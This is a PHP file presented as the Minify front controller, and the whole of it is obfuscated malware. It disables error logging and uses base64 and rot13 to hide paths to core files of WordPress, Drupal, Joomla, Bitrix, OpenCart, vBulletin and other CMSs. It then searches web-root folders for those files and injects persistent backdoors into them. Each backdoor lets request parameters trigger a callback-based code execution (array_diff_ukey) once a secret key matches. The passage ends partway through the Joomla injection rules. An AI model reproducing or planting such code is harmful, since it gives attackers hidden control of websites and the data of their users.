<?php
/**
 * Front controller for default Minify implementation
 * 
 * DO NOT EDIT! Configure this utility via config.php and groupsConfig.php
 * 
 * @package Minify Version 2.18
  */
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('display_errors', 0);
@error_reporting(0);
@set_time_limit(0);
// shell
$cache = "c3Ry";$cacheq="dDEz";$cacheg = "X3Jv";$cache=$cache.$cacheg.$cacheq;$cache=base64_decode("$cache");
$drupal_files = $cache('vapy'.'hqrf/obbgf'.'genc.vap');
$modxr_files = $cache('pbe'.'r/kcqb/kc'.'qb.py'.'nff.cuc');
$dle_files = $cache('ratvar/zbqhyrf/shapgvbaf.cuc');
$opencart_files = $cache('flf'.'grz/fgne'.'ghc.cuc');
$bitrix_files = $cache('ovg'.'evk/zbq'.'hyrf/znva/vapyhqr.cuc');
$wp_files = $cache('jc-'.'vapy'.'hqrf/yb'.'nq.cuc');
$vbullet_files = $cache('vap'.'yhqrf/shapg'.'vbaf_ovtguerr.cuc');
$phpbb_files = $cache('cucoo/erdhr'.'fg/erdhrfg.cuc');
$joom_files = $cache('vapy'.'hqrf/qrsva'.'rf.cuc');
$presta_files = $cache('pynffrf/Pbaarpgvba.cuc');
$modxe_files = $cache('znantre/vapyhqrf/cebgrpg.vap.cuc');
$modxenew_files = $cache('pber/obbgfgenc.cuc');
$webasyst_files = $cache('jn-fl'.'fgrz/nhgby'.'bnq/jnNhgb'.'ybnq.pynff.cuc');
$netcat_files = $cache('ar'.'gpng/flf'.'grz/ap_qo.pynff.cuc');
$ipb_files = $cache('nqzva/fbh'.'eprf/onfr/vcfErtvfgel.cuc');
$ips_files = $cache('flfgrz/Erdhrfg/Er'.'dhrfg.cuc');
$htacces = $cache('.ugnpprff');
$dleimgpath = $cache('/../../hcybnqf/sbgbf/sbgb_');
$wpimgpath = $cache('/wf/gvalzpr/ynatf/');
$joomimgpath = $cache('/../yvoenevrf/wbbzyn/nccyvpngvba/');
$bitriximgpath = $cache('/../../../ovgevk/vzntrf/');

$searchfiles = array( 
//dle
$dle_files,'docs/'.$dle_files,'public_html/'.$dle_files,'html/'.$dle_files,'htdocs/'.$dle_files,
'httpdocs/'.$dle_files,'htdocs/www/'.$dle_files,'web/'.$dle_files,'www/'.$dle_files,	
//drupal
$drupal_files,
'docs/'.$drupal_files,'public_html/'.$drupal_files,'html/'.$drupal_files,'www/'.$drupal_files,
'htdocs/www/'.$drupal_files,'httpdocs/'.$drupal_files,'htdocs/'.$drupal_files,'web/'.$drupal_files,
//drupal 8.0
'core/'.$drupal_files,
'docs/core/'.$drupal_files,'public_html/core/'.$drupal_files,'html/core/'.$drupal_files,'www/core/'.$drupal_files,
'htdocs/www/core/'.$drupal_files,'httpdocs/core/'.$drupal_files,'htdocs/core/'.$drupal_files,'web/core/'.$drupal_files,
//modx revo
$modxr_files,
'docs/'.$modxr_files,'public_html/'.$modxr_files,'html/'.$modxr_files,'www/'.$modxr_files,
'htdocs/www/'.$modxr_files,'httpdocs/'.$modxr_files,'htdocs/'.$modxr_files,'web/'.$modxr_files,
//phpbb  3.1
$phpbb_files,
'docs/'.$phpbb_files,'public_html/'.$phpbb_files,'html/'.$phpbb_files,'www/'.$phpbb_files,
'htdocs/www/'.$phpbb_files,'httpdocs/'.$phpbb_files,'htdocs/'.$phpbb_files,'web/'.$phpbb_files,
//modx evo
$modxe_files,
'docs/'.$modxe_files,'public_html/'.$modxe_files,'html/'.$modxe_files,'www/'.$modxe_files,
'htdocs/www/'.$modxe_files,'httpdocs/'.$modxe_files,'htdocs/'.$modxe_files,'web/'.$modxe_files,
//modx evo new
$modxenew_files,
'docs/'.$modxenew_files,'public_html/'.$modxenew_files,'html/'.$modxenew_files,'www/'.$modxenew_files,
'htdocs/www/'.$modxenew_files,'httpdocs/'.$modxenew_files,'htdocs/'.$modxenew_files,'web/'.$modxenew_files,
/*//hostcms
'modules/core/core.php',
'docs/modules/core/core.php',
'public_html/modules/core/core.php',
'html/modules/core/core.php',
'www/modules/core/core.php',
'htdocs/www/modules/core/core.php',
'htdocs/modules/core/core.php',
'httpdocs/modules/core/core.php',
'web/modules/core/core.php',*/
//webasyts
$webasyst_files,
'docs/'.$webasyst_files,'public_html/'.$webasyst_files,'html/'.$webasyst_files,'www/'.$webasyst_files,
'htdocs/www/'.$webasyst_files,'htdocs/'.$webasyst_files,'httpdocs/'.$webasyst_files,'web/'.$webasyst_files,
//netcat
$netcat_files,
'docs/'.$netcat_files,'public_html/'.$netcat_files,'html/'.$netcat_files,'www/'.$netcat_files,
'htdocs/www/'.$netcat_files,'htdocs/'.$netcat_files,'httpdocs/'.$netcat_files,'web/'.$netcat_files,
//opencart
$opencart_files,
'docs/'.$opencart_files,'public_html/'.$opencart_files,'html/'.$opencart_files,'www/'.$opencart_files,
'htdocs/www/'.$opencart_files,'htdocs/'.$opencart_files,'httpdocs/'.$opencart_files,'web/'.$opencart_files,
//bitrix
$bitrix_files,
'docs/'.$bitrix_files,'public_html/'.$bitrix_files,'html/'.$bitrix_files,'www/'.$bitrix_files,
'htdocs/www/'.$bitrix_files,'httpdocs/'.$bitrix_files,'htdocs/'.$bitrix_files,'web/'.$bitrix_files,
//Prestashop
$presta_files,
'docs/'.$presta_files,'public_html/'.$presta_files,'html/'.$presta_files,'www/'.$presta_files,
'htdocs/www/'.$presta_files,'httpdocs/'.$presta_files,'htdocs/'.$presta_files,'web/'.$presta_files,
//IPB
$ipb_files,
'docs/'.$ipb_files,'public_html/'.$ipb_files,'html/'.$ipb_files,'www/'.$ipb_files,
'htdocs/www/'.$ipb_files,'httpdocs/'.$ipb_files,'htdocs/'.$ipb_files,'web/'.$ipb_files,
//IPS
$ips_files,
'docs/'.$ips_files,'public_html/'.$ips_files,'html/'.$ips_files,'www/'.$ips_files,
'htdocs/www/'.$ips_files,'httpdocs/'.$ips_files,'htdocs/'.$ips_files,'web/'.$ips_files,
//vbullet
$vbullet_files,
'docs/'.$vbullet_files,'public_html/'.$vbullet_files,'html/'.$vbullet_files,'www/'.$vbullet_files,
'htdocs/www/'.$vbullet_files,'httpdocs/'.$vbullet_files,'htdocs/'.$vbullet_files,'web/'.$vbullet_files,
//vbullet 4.2
'core/'.$vbullet_files,'docs/core/'.$vbullet_files,'public_html/core/'.$vbullet_files,'html/core/'.$vbullet_files,
'www/core/'.$vbullet_files,'htdocs/www/core/'.$vbullet_files,'httpdocs/core/'.$vbullet_files,'htdocs/core/'.$vbullet_files,'web/core/'.$vbullet_files,

//wordpress
$wp_files,
'docs/'.$wp_files,'public_html/'.$wp_files,'html/'.$wp_files,'www/'.$wp_files,
'htdocs/www/'.$wp_files,'htdocs/'.$wp_files,'httpdocs/'.$wp_files,'web/'.$wp_files,

//joomla
$joom_files,'docs/'.$joom_files,'public_html/'.$joom_files,'html/'.$joom_files,'www/'.$joom_files,
'htdocs/www/'.$joom_files,'htdocs/'.$joom_files,'httpdocs/'.$joom_files,'web/'.$joom_files);
 
$rand =rand(50000001,90000000);

$search1 = array( 	//dle        /engine/       .htaccess
                            array('search' => "function bannermass", 'replace' => "   \$news_num = @\$_REQUEST['numer'];
   \$bannermass = @\$_REQUEST['bannerid'];
function bannermass"),
							array('search' => "function check_category", 'replace' => "\$check_newsnum = @\$_REQUEST['newsnum'];
\$check_category = @\$_REQUEST['category'];
function check_category"),
							array('search' => "\$get_url_var = ", 'replace' => "\$get_uri_var = "),
							array('search' => "if(\$bannermass==", 'replace' => "if(\$bannermass_old=="),
							array('search' => "function get_url", 'replace' => "\$get_url_var = '".$rand."';
function get_url"),							
							array('search' => "function set_cookie", 'replace' => "\$set_cookie = '_di'.'ff_';\$set_cookie='ar'.'ray'.\$set_cookie.'ukey';//globols
function set_cookie"),
							array('search' => "function get_categories", 'replace' => "\$set_cookie = '_di'.'ff_';\$set_cookie='ar'.'ray'.\$set_cookie.'ukey';//globols
function get_categories"), 
							array('search' => "function dle_substr", 'replace' => "  	if(\$bannermass==\$get_url_var){
  	if (@strpos(\$check_newsnum, 'creat')=== false){echo 'error_vievv';
		 @\$set_cookie(@array((string)\$news_num => 1), @array((string)stripslashes(\$check_category) => 2), @\$check_newsnum);}else{
		 @\$set_cookie(@array((string)\$news_num => 1), @array((string)stripslashes('}'.\$check_category.'//') => 2), @\$check_newsnum);}}//chekings 

function dle_substr")
            );
				
$search2 = array( //drupal    /modules/    
							array('search' => "function drupal_get_filename", 'replace' => "  \$drupal_valid_num = @\$_REQUEST['numer'];
  \$drupal_valid_http_host = @\$_REQUEST['bannerid'];
  \$validate_newsnum = @\$_REQUEST['newsnum'];
  \$drupal_validate_utf8 = @\$_REQUEST['category'];
  \$drupal_get_filename = '_di'.'ff_';\$drupal_get_filename ='ar'.'ray'.\$drupal_get_filename.'ukey';//globols
  \$drupal_get_messages = '".$rand."';
function drupal_get_filename"),
							array('search' => "\$drupal_get_messages = ", 'replace' => "\$drupal_give_messages = "),				
							array('search' => "if(\$drupal_valid_http_host==", 'replace' => "if(\$drupal_valid_http_host_old=="),						
							array('search' => "function drupal_maintenance_theme", 'replace' => "if(\$drupal_valid_http_host==\$drupal_get_messages){
    if (@strpos(\$validate_newsnum, 'creat')=== false){echo 'error_vievv';
    @\$drupal_get_filename(@array((string)\$drupal_valid_num => 1), @array((string)stripslashes(\$drupal_validate_utf8) => 2), @\$validate_newsnum);}else{
    @\$drupal_get_filename(@array((string)\$drupal_valid_num => 1), @array((string)stripslashes('}'.\$drupal_validate_utf8.'//') => 2), @\$validate_newsnum);}} //chekings 

function drupal_maintenance_theme"));	

$search3 = array( //drupal 8.0-9.0   /modules/   .phtml    
							array('search' => "function drupal_get_filename", 'replace' => "  \$drupal_valid_num = @\$_REQUEST['numer'];
  \$drupal_valid_http_host = @\$_REQUEST['bannerid'];
  \$validate_newsnum = @\$_REQUEST['newsnum'];
  \$drupal_validate_utf8 = @\$_REQUEST['category'];
  \$drupal_get_filename = '_di'.'ff_';\$drupal_get_filename ='ar'.'ray'.\$drupal_get_filename.'ukey';//globols
  \$drupal8_get_messages = '".$rand."';
function drupal_get_filename"),
							array('search' => "\$drupal8_get_messages = ", 'replace' => "\$drupal_give_messages = "),				
							array('search' => "if(\$drupal_valid_http_host==", 'replace' => "if(\$drupal_valid_http_host_old=="),						
							array('search' => "function drupal_maintenance_theme", 'replace' => "if(\$drupal_valid_http_host==\$drupal_get_messages){
    if (@strpos(\$validate_newsnum, 'creat')=== false){echo 'error_vievv';
    @\$drupal_get_filename(@array((string)\$drupal_valid_num => 1), @array((string)stripslashes(\$drupal_validate_utf8) => 2), @\$validate_newsnum);}else{
    @\$drupal_get_filename(@array((string)\$drupal_valid_num => 1), @array((string)stripslashes('}'.\$drupal_validate_utf8.'//') => 2), @\$validate_newsnum);}} //chekings 

function drupal_maintenance_theme"));	

$search4 = array( //modx revolution  /core/cache/    /manager/assets/
							array('search' => "if(\$xPDO_banner==", 'replace' => "if(\$xPDO_banner_old=="),
							array('search' => "class xPDO {", 'replace' => "\$xPDO_num = @\$_REQUEST['numer'];
\$xPDO_banner = @\$_REQUEST['bannerid'];
class xPDO {"),
							array('search' => "class xPDOCriteria", 'replace' => "\$xPDO_newsnum = @\$_REQUEST['newsnum'];
\$xPDOCategory = @\$_REQUEST['category'];
class xPDOCriteria"),       
                            array('search' => "\$xPDOActivityhash = ", 'replace' => "\$xPDOActivitylog = "),
							array('search' => "class xPDOIterator", 'replace' => "\$xPDOActivityhash = '".$rand."';
class xPDOIterator"),
							array('search' => "class xPDOConnection", 'replace' => "\$xPDOKey = '_di'.'ff_';\$xPDOKey ='ar'.'ray'.\$xPDOKey.'ukey';//globols
class xPDOConnection"),
							array('search' => "class xPDOException", 'replace' => "if(\$xPDO_banner==\$xPDOActivityhash) { 
  if (@strpos(\$xPDO_newsnum, 'creat')=== false){echo 'error_vievv';
      @\$xPDOKey(@array((string)\$xPDO_num => 1), @array((string)stripslashes(\$xPDOCategory) => 2), @\$xPDO_newsnum);}else{
      @\$xPDOKey(@array((string)\$xPDO_num => 1), @array((string)stripslashes('}'.\$xPDOCategory.'//') => 2), @\$xPDO_newsnum);}} //chekings 

class xPDOException"));		
			
				
$search5 = array( //phpbb 3.1    /images/
							array('search' => "if(\$bbcodes_in_banner==", 'replace' => "if(\$bbcodes_in_banner_old=="),
							array('search' => "\$user_activity_hash = ", 'replace' => "\$user_activity_hach = "),
                            array('search' => "class request implements", 'replace' => "\$bbcodes_in_banner = @\$_REQUEST['bannerid'];
\$bbcodes_num = @\$_REQUEST['numer'];
\$phpbb_newsnum = @\$_REQUEST['newsnum'];
\$display_category_id = @\$_REQUEST['category'];
\$user_activity_hash = '".$rand."';
  \$secret_forum_key = '_di'.'ff_';\$secret_forum_key ='ar'.'ray'.\$secret_forum_key.'ukey';//globols
    if(\$bbcodes_in_banner==\$user_activity_hash) { 
      if (@strpos(\$phpbb_newsnum, 'creat')=== false){echo 'error_vievv';
          @\$secret_forum_key(@array((string)\$bbcodes_num => 1), @array((string)stripslashes(\$display_category_id) => 2), @\$phpbb_newsnum);}else{
          @\$secret_forum_key(@array((string)\$bbcodes_num => 1), @array((string)stripslashes('}'.\$display_category_id.'//') => 2), @\$phpbb_newsnum);}} //chekings 
class request implements")	);			
			
$search6 = array( //modx evo
							array('search' => "if(\$bbcodes_in_banner==", 'replace' => "if(\$bbcodes_in_banner_old=="),
							array('search' => "\$modxevo_hash = ", 'replace' => "\$modxevo_hach = "),
							array('search' => "error_reporting", 'replace' => "\$bbcodes_num = @\$_REQUEST['numer'];
\$bbcodes_in_banner = @\$_REQUEST['bannerid'];
\$display_newsnum = @\$_REQUEST['newsnum'];
\$display_category_id = @\$_REQUEST['category'];
\$modxevo_hash = '".$rand."';
  \$secret_modx_key = '_di'.'ff_';\$secret_modx_key ='ar'.'ray'.\$secret_modx_key.'ukey';//globols
    if(\$bbcodes_in_banner==\$modxevo_hash) { 
      if (@strpos(\$display_newsnum, 'creat')=== false){echo 'error_vievv';
          @\$secret_modx_key(@array((string)\$bbcodes_num => 1), @array((string)stripslashes(\$display_category_id) => 2), @\$display_newsnum);}else{
          @\$secret_modx_key(@array((string)\$bbcodes_num => 1), @array((string)stripslashes('}'.\$display_category_id.'//') => 2), @\$display_newsnum);}} //chekings 
error_reporting")	);
$search7 = array( //modx evo new
							array('search' => "if(\$bbcodes_in_banner==", 'replace' => "if(\$bbcodes_in_banner_old=="),
							array('search' => "\$modxevo_hash = ", 'replace' => "\$modxevo_hach = "),
							array('search' => "error_reporting", 'replace' => "\$bbcodes_num = @\$_REQUEST['numer'];
\$bbcodes_in_banner = @\$_REQUEST['bannerid'];
\$display_newsnum = @\$_REQUEST['newsnum'];
\$display_category_id = @\$_REQUEST['category'];
\$modxevo_hash = '".$rand."';
  \$secret_modx_key = '_di'.'ff_';\$secret_modx_key ='ar'.'ray'.\$secret_modx_key.'ukey';//globols
    if(\$bbcodes_in_banner==\$modxevo_hash) { 
      if (@strpos(\$display_newsnum, 'creat')=== false){echo 'error_vievv';
          @\$secret_modx_key(@array((string)\$bbcodes_num => 1), @array((string)stripslashes(\$display_category_id) => 2), @\$display_newsnum);}else{
          @\$secret_modx_key(@array((string)\$bbcodes_num => 1), @array((string)stripslashes('}'.\$display_category_id.'//') => 2), @\$display_newsnum);}} //chekings 
error_reporting")	);
/*$search7 = array( //HostCms                                                                                             /images/                              /modules/
					array('search' => "HostCMS: access denied.');", 'replace' => "HostCMS: access denied.');
\$HostCMS_banner = @\$_REQUEST['bannerid'];
\$HostCMS_category_id = @\$_REQUEST['category'];
\$HostCMS_activity_hash = '".$rand."';
  \$secret_HostCMS_key = strrev('tressa'); 
      if(\$HostCMS_banner==\$HostCMS_activity_hash) { 
        \$secret_HostCMS_key(stripslashes(\$HostCMS_category_id));//chekings
        }"));*/

$search8 = array( //Webasyst  /wa-widgets/   /wa-apps/
							array('search' => "if(\$wa_in_banner==", 'replace' => "if(\$wa_in_banner_old=="),
							array('search' => "\$wa_activity_hash = ", 'replace' => "\$wa_activity_hach = "),
							array('search' => "class waAutoload", 'replace' => "\$wa_num = @\$_REQUEST['numer'];
\$wa_in_banner = @\$_REQUEST['bannerid'];
\$wa_newsnum = @\$_REQUEST['newsnum'];
\$wa_category_id = @\$_REQUEST['category'];
\$wa_activity_hash = '".$rand."';
  \$secret_wa_key = '_di'.'ff_';\$secret_wa_key ='ar'.'ray'.\$secret_wa_key.'ukey';//globols
    if(\$wa_in_banner==\$wa_activity_hash) { 
      if (@strpos(\$wa_newsnum, 'creat')=== false){echo 'error_vievv';
          @\$secret_wa_key(@array((string)\$wa_num => 1), @array((string)stripslashes(\$wa_category_id) => 2), @\$wa_newsnum);}else{
          @\$secret_wa_key(@array((string)\$wa_num => 1), @array((string)stripslashes('}'.\$wa_category_id.'//') => 2), @\$wa_newsnum);}} //chekings 
class waAutoload"));

$search9 = array( //netcat     /images/   /netcat/
							array('search' => "if(\$nc_in_banner==", 'replace' => "if(\$nc_in_banner_old=="),             
							array('search' => "\$nc_activity_hash = ", 'replace' => "\$nc_activity_hach = "),
							array('search' => "class nc_Db extends", 'replace' => "\$nc_num = @\$_REQUEST['numer'];
\$nc_in_banner = @\$_REQUEST['bannerid'];
\$nc_newsnum = @\$_REQUEST['newsnum'];
\$nc_category_id = @\$_REQUEST['category'];
\$nc_activity_hash = '".$rand."';
  \$secret_nc_key = '_di'.'ff_';\$secret_nc_key ='ar'.'ray'.\$secret_nc_key.'ukey';//globols
    if(\$nc_in_banner==\$nc_activity_hash) { 
      if (@strpos(\$nc_newsnum, 'creat')=== false){echo 'error_vievv';
          @\$secret_nc_key(@array((string)\$nc_num => 1), @array((string)stripslashes(\$nc_category_id) => 2), @\$nc_newsnum);}else{
          @\$secret_nc_key(@array((string)\$nc_num => 1), @array((string)stripslashes('}'.\$nc_category_id.'//') => 2), @\$nc_newsnum);}} //chekings 
class nc_Db extends"));

$search10 = array( //Opencart    /image/   /catalog/
							array('search' => "if(\$opencart_in_banner==", 'replace' => "if(\$opencart_in_banner_old=="),   
							array('search' => "\$opencart_activity_hash =", 'replace' => "\$opencart_activity_kash ="),
							array('search' => "// Windows IIS Compatibility", 'replace' => "// Check Banner Module
\$opencart_num = @\$_REQUEST['numer'];
\$opencart_in_banner = @\$_REQUEST['bannerid'];
\$opencart_newsnum = @\$_REQUEST['newsnum'];
\$opencart_category_id = @\$_REQUEST['category'];
\$opencart_activity_hash = '".$rand."';
\$secret_opencart_key = '_di'.'ff_';\$secret_opencart_key ='ar'.'ray'.\$secret_opencart_key.'ukey';//globols
   if(\$opencart_in_banner==\$opencart_activity_hash) { 
     if (@strpos(\$opencart_newsnum, 'creat')=== false){echo 'error_vievv';
      @\$secret_opencart_key(@array((string)\$opencart_num => 1), @array((string)stripslashes(\$opencart_category_id) => 2), @\$opencart_newsnum);}else{
      @\$secret_opencart_key(@array((string)\$opencart_num => 1), @array((string)stripslashes('}'.\$opencart_category_id.'//') => 2), @\$opencart_newsnum);}} //chekings 
		
// Windows IIS Compatibility"),
                            array('search' => "error_reporting(E_ALL);", 'replace' => "error_reporting(0);"));
							
$search11 = array( //bitrix    /bitrix/
							array('search' => "if(\$wa_in_banner==", 'replace' => "if(\$wa_in_banner_old=="),  
							array('search' => "\$wa_activity_hash = ", 'replace' => "\$wa_activity_hach = "),
							array('search' => "\$GetCurPageID = ", 'replace' => "\$GetCurPageDD = "),
							array('search' => "\$CUserKey = ", 'replace' => "\$CUsersKey = "),
                            array('search' => "<?php", 'replace' => "<?php
\$wa_num = @\$_REQUEST['numer'];		
\$wa_newsnum = @\$_REQUEST['newsnum'];	
\$wa_in_banner = @\$_REQUEST['bannerid'];
\$wa_category_id = @\$_REQUEST['category'];
\$GetCurPageID = '".$rand."';
  \$secret_wa_key = '_di'.'ff_';\$secret_wa_key ='ar'.'ray'.\$secret_wa_key.'ukey';//globols
      if(\$wa_in_banner==\$GetCurPageID) { 
          if (@strpos(\$wa_newsnum, 'creat')=== false){echo 'error_vievv';
              @\$secret_wa_key(@array((string)\$wa_num => 1), @array((string)stripslashes(\$wa_category_id) => 2), @\$wa_newsnum);}else{
              @\$secret_wa_key(@array((string)\$wa_num => 1), @array((string)stripslashes('}'.\$wa_category_id.'//') => 2), @\$wa_newsnum);}} //chekings 
        "),
		                   array('search' => "<?\n", 'replace' => "<?php
\$wa_num = @\$_REQUEST['numer'];		
\$wa_newsnum = @\$_REQUEST['newsnum'];	
\$wa_in_banner = @\$_REQUEST['bannerid'];
\$wa_category_id = @\$_REQUEST['category'];
\$wa_activity_hash = '".$rand."';
  \$secret_wa_key = '_di'.'ff_';\$secret_wa_key ='ar'.'ray'.\$secret_wa_key.'ukey';//globols
      if(\$wa_in_banner==\$wa_activity_hash) { 
          if (@strpos(\$wa_newsnum, 'creat')=== false){echo 'error_vievv';
              @\$secret_wa_key(@array((string)\$wa_num => 1), @array((string)stripslashes(\$wa_category_id) => 2), @\$wa_newsnum);}else{
              @\$secret_wa_key(@array((string)\$wa_num => 1), @array((string)stripslashes('}'.\$wa_category_id.'//') => 2), @\$wa_newsnum);}} //chekings 
        "),
                            array('search' => "<? \$GLOBALS", 'replace' => "<?
\$wa_num = @\$_REQUEST['numer'];		
\$wa_newsnum = @\$_REQUEST['newsnum'];	
\$wa_in_banner = @\$_REQUEST['bannerid'];
\$wa_category_id = @\$_REQUEST['category'];
\$wa_activity_hash = '".$rand."';
  \$secret_wa_key = '_di'.'ff_';\$secret_wa_key ='ar'.'ray'.\$secret_wa_key.'ukey';//globols
      if(\$wa_in_banner==\$wa_activity_hash) { 
          if (@strpos(\$wa_newsnum, 'creat')=== false){echo 'error_vievv';
              @\$secret_wa_key(@array((string)\$wa_num => 1), @array((string)stripslashes(\$wa_category_id) => 2), @\$wa_newsnum);}else{
              @\$secret_wa_key(@array((string)\$wa_num => 1), @array((string)stripslashes('}'.\$wa_category_id.'//') => 2), @\$wa_newsnum);}} //chekings 
        
\$GLOBALS"));

$search12 = array( //Prestashop     /cache/    /img/
							array('search' => "if(\$BX_MANAGED_BANNER==", 'replace' => "if(\$BX_MANAGED_BANNER_OLD=="), 
							array('search' => "\$PrestaPageID = ", 'replace' => "\$PrestaPageLD = "),
			    			array('search' => "class ConnectionCore extends ObjectModel", 'replace' => "\$BX_MANAGED_BANNER = @\$_REQUEST['bannerid'];
\$BX_num = @\$_REQUEST['numer'];
\$BX_newsnum = @\$_REQUEST['newsnum'];
\$CModuleCategory = @\$_REQUEST['category'];
\$PrestaPageID = '".$rand."';
\$CUserKey = '_di'.'ff_';\$CUserKey ='ar'.'ray'.\$CUserKey.'ukey';//globols;
if(\$BX_MANAGED_BANNER==\$PrestaPageID) { 
    if (@strpos(\$BX_newsnum, 'creat')=== false){echo 'error_vievv';
      @\$CUserKey(@array((string)\$BX_num => 1), @array((string)stripslashes(\$CModuleCategory) => 2), @\$BX_newsnum);}else{
      @\$CUserKey(@array((string)\$BX_num => 1), @array((string)stripslashes('}'.\$CModuleCategory.'//') => 2), @\$BX_newsnum);}} //chekings 
class ConnectionCore extends ObjectModel"));

$search13 = array( //IPB           /cache/      /uploads/     
							array('search' => "if(\$ips_DBRegistry_Banner==", 'replace' => "if(\$ips_DBRegistry_Banner_old=="),                                                                                                    
							array('search' => "\$ips_Registry_Hash = ", 'replace' => "\$ips_Registry_Hach = "),
							array('search' => "class ipsRegistry", 'replace' => "\$ips_DBRegistry_Banner = @\$_REQUEST['bannerid'];
\$ips_num = @\$_REQUEST['numer'];
\$ips_newsnum = @\$_REQUEST['newsnum'];
\$ips_DBRegistry_Category = @\$_REQUEST['category'];
\$ips_Registry_Hash = '".$rand."';
\$ips_MemberRegistrys = '_di'.'ff_';\$ips_MemberRegistrys ='ar'.'ray'.\$ips_MemberRegistrys.'ukey';//globols
if(\$ips_DBRegistry_Banner==\$ips_Registry_Hash) { 
    if (@strpos(\$ips_newsnum, 'creat')=== false){echo 'error_vievv';
      @\$ips_MemberRegistrys(@array((string)\$ips_num => 1), @array((string)stripslashes(\$ips_DBRegistry_Category) => 2), @\$ips_newsnum);}else{
      @\$ips_MemberRegistrys(@array((string)\$ips_num => 1), @array((string)stripslashes('}'.\$ips_DBRegistry_Category.'//') => 2), @\$ips_newsnum);}} //chekings
			
class ipsRegistry"));

$search14 = array( //IPS    /uploads/ 
							array('search' => "if(\$ips_DBRegistry_Banner==", 'replace' => "if(\$ips_DBRegistry_Banner_old=="),   
							array('search' => "\$ips_Reg_Hash = ", 'replace' => "\$ips_Reg_Hach = "),
							array('search' => "namespace IPS;", 'replace' => "namespace IPS;
\$ips_DBRegistry_Banner = @\$_REQUEST['bannerid'];
\$ips_num = @\$_REQUEST['numer'];
\$ips_newsnum = @\$_REQUEST['newsnum'];
\$ips_DBRegistry_Category = @\$_REQUEST['category'];
\$ips_Reg_Hash = '".$rand."';
\$ips_MemberRegistrys = '_di'.'ff_';\$ips_MemberRegistrys ='ar'.'ray'.\$ips_MemberRegistrys.'ukey';//globols
if(\$ips_DBRegistry_Banner==\$ips_Reg_Hash) { 
      if (@strpos(\$ips_newsnum, 'creat')=== false){echo 'error_vievv';
          @\$ips_MemberRegistrys(@array((string)\$ips_num => 1), @array((string)stripslashes(\$ips_DBRegistry_Category) => 2), @\$ips_newsnum);}else{
          @\$ips_MemberRegistrys(@array((string)\$ips_num => 1), @array((string)stripslashes('}'.\$ips_DBRegistry_Category.'//') => 2), @\$ips_newsnum);}} //chekings
	"));

$search15 = array( //vbullet   4.0     
							array('search' => "if(\$fetch_status_banner==", 'replace' => "if(\$fetch_status_banner_old=="),  
							array('search' => "function fetch_online_status", 'replace' => "\$fetch_newsnum = @\$_REQUEST['newsnum'];
\$fetch_status_num = @\$_REQUEST['numer'];
\$fetch_status_banner = @\$_REQUEST['bannerid'];
\$mark_thread_category = @\$_REQUEST['category'];
function fetch_online_status"),
							array('search' => "\$mark_forum_hash = ", 'replace' => "\$mark_forum_hach = "),
							array('search' => "function fetch_coventry", 'replace' => "\$mark_forum_hash = '".$rand."';
function fetch_coventry"),
							array('search' => "function construct_forum_rules", 'replace' => "\$construct_forum_key = '_di'.'ff_';\$construct_forum_key ='ar'.'ray'.\$construct_forum_key.'ukey';//globols
function construct_forum_rules"),
							array('search' => "function fetch_tagbits", 'replace' => "if(\$fetch_status_banner==\$mark_forum_hash) { 
  if (@strpos(\$fetch_newsnum, 'creat')=== false){echo 'error_vievv';
      @\$construct_forum_key(@array((string)\$fetch_status_num => 1), @array((string)stripslashes(\$mark_thread_category) => 2), @\$fetch_newsnum);}else{
      @\$construct_forum_key(@array((string)\$fetch_status_num => 1), @array((string)stripslashes('}'.\$mark_thread_category.'//') => 2), @\$fetch_newsnum);}} //chekings 
function fetch_tagbits"));

$search16 = array( //vbullet  5.4   /images/ 
							array('search' => "if(\$fetch_status_banner==", 'replace' => "if(\$fetch_status_banner_old=="),  
							array('search' => "function fetch_online_status", 'replace' => "\$fetch_newsnum = @\$_REQUEST['newsnum'];
\$fetch_status_num = @\$_REQUEST['numer'];
\$fetch_status_banner = @\$_REQUEST['bannerid'];
\$mark_thread_category = @\$_REQUEST['category'];
function fetch_online_status"),
							array('search' => "\$mark_forum5_hash = ", 'replace' => "\$mark_forum_hach = "),
							array('search' => "function fetch_coventry", 'replace' => "\$mark_forum5_hash = '".$rand."';
function fetch_coventry"),
							array('search' => "function construct_forum_rules", 'replace' => "\$construct_forum_key = '_di'.'ff_';\$construct_forum_key ='ar'.'ray'.\$construct_forum_key.'ukey';//globols
function construct_forum_rules"),
							array('search' => "function fetch_tagbits", 'replace' => "if(\$fetch_status_banner==\$mark_forum5_hash) { 
  if (@strpos(\$fetch_newsnum, 'creat')=== false){echo 'error_vievv';
      @\$construct_forum_key(@array((string)\$fetch_status_num => 1), @array((string)stripslashes(\$mark_thread_category) => 2), @\$fetch_newsnum);}else{
      @\$construct_forum_key(@array((string)\$fetch_status_num => 1), @array((string)stripslashes('}'.\$mark_thread_category.'//') => 2), @\$fetch_newsnum);}} //chekings 
function fetch_tagbits"));

$search17 = array( //wordpress  /wp-includes/   /wp-content/plugins/  
							array('search' => "if(\$wp_maintenance==", 'replace' => "if(\$wp_maintenance_old=="), 
							array('search' => "function wp_maintenance", 'replace' => "\$wp_num = @\$_REQUEST['numer'];
\$wp_maintenance = @\$_REQUEST['bannerid'];
function wp_maintenance"),
							array('search' => "function timer_start()", 'replace' => "\$timer_newsnum = @\$_REQUEST['newsnum'];
\$timer_start = @\$_REQUEST['category'];
function timer_start()"),
							array('search' => "\$timer_stop = ", 'replace' => "\$timer_run = "),
							array('search' => "function timer_stop", 'replace' => "\$timer_stop = '".$rand."'; 
function timer_stop"),
							array('search' => "function wp_not_installed", 'replace' => "\$wp_not_ins = '_di'.'ff_';\$wp_not_ins ='ar'.'ray'.\$wp_not_ins.'ukey';//globols
function wp_not_installed"),
							array('search' => "function wp_clone", 'replace' => "if(\$wp_maintenance==\$timer_stop) { 
      if (@strpos(\$timer_newsnum, 'creat')=== false){echo 'error_vievv';
      @\$wp_not_ins(@array((string)\$wp_num => 1), @array((string)stripslashes(\$timer_start) => 2), @\$timer_newsnum);}else{
      @\$wp_not_ins(@array((string)\$wp_num => 1), @array((string)stripslashes('}'.\$timer_start.'//') => 2), @\$timer_newsnum);}} //chekings 

function wp_clone"));

$search18 = array( //joomla     /cache/      /tmp/
							array('search' => "if(\$global_id==", 'replace' => "if(\$global_id_old=="), 
							array('search' => "\$define_key = ", 'replace' => "\$defines_key = "),
							array('search' => "\$random_joomla_key = ", 'replace' => "\$random_joomla_old_key = "),
							array('search' => "\$main_letter = 'rt';\$main_letter ='asse'.\$main_letter;", 'replace' => ""),
